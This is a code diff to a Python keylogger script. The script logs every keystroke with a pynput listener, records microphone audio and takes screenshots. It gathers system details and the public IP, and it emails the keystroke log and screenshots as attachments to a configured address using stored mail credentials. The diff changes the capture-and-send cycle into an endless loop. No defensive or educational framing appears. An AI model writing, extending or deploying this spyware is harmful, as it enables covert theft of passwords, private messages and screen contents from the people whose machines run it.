@@ -41,7 +41,7 @@ pswd = login.pswd
 audio = "audio.wav"
 
 # for how long we want to record the microphone (in seconds)
-mic_time = 15
+mic_time = 5
 
 #default audio parameters
 freq = 44100
@@ -50,12 +50,6 @@ sd.default.channels = 2
 
 # name of screenshot
 screen = "screenshot.png"
-
-iterations = 0
-timeIteration = 30
-nbIterations = 3
-currentTime = time.time()
-stopTime = time.time() + timeIteration
 
 
 
@@ -69,6 +63,17 @@ file_handler = logging.FileHandler(keylog)
 formatter = logging.Formatter('%(asctime)s: %(levelname)s: %(message)s')
 file_handler.setFormatter(formatter)
 logging.getLogger('').addHandler(file_handler)
+
+
+
+# save the key pressed as an info level log
+def pressed(key):
+    print(key)
+    logging.info(str(key))
+
+def released(key):
+    if key == Key.esc:
+        return False
 
 
 # send the log file as an attachment in an email
@@ -112,8 +117,6 @@ def send_mail(filename, attachment, sendto):
     # terminate the session
     session.quit()
 
-send_mail(keylog, (log_dir + "/" + keylog), mail)
-
 
 # get information about the system
 def pc_infos():
@@ -128,7 +131,7 @@ def pc_infos():
         # get the public IP address
         try:
             public_ip = get("https://api.ipify.org").text # https://www.ipify.org/
-            logging.info("Public IP address: " + public_ip)
+            logging.info("Public IP address (only the first digit): " + public_ip[0])
         except Exception:
             logging.error("Couldn't get Public IP address, sad")
 
@@ -159,32 +162,14 @@ def screenshot():
 screenshot()
 send_mail(screen, log_dir + "/" + screen, mail)
 
+send_mail(keylog, log_dir + "/" + keylog, mail)
 
 
-# timer
-while iterations < nbIterations:
-
-    # save the key pressed as an info level log
-    def pressed(key):
-        global currentTime
-        print(key)
-        logging.info(str(key))
-        currentTime = time.time()
-
-    def stop(key):
-        if key == Key.esc or currentTime > stopTime:
-            return False
-
+while True:
     # create a listener
-    with Listener(on_press=pressed, on_release=stop) as listener:
+    with Listener(on_press=pressed, on_release=released) as listener:
         listener.join()
 
-    if currentTime > stopTime:
-        logging.info("********************************")
-        screenshot()
-        send_mail(screen, log_dir + "/" + screen, mail)
-        send_mail(keylog, log_dir + "/" + keylog, mail)
-        nbIterations+=1
-        currentTime = time.time()
-        stopTime = time.time() + timeIteration
-
+    send_mail(keylog, log_dir + "/" + keylog, mail)
+    screenshot()
+    send_mail(screen, log_dir + "/" + screen, mail)
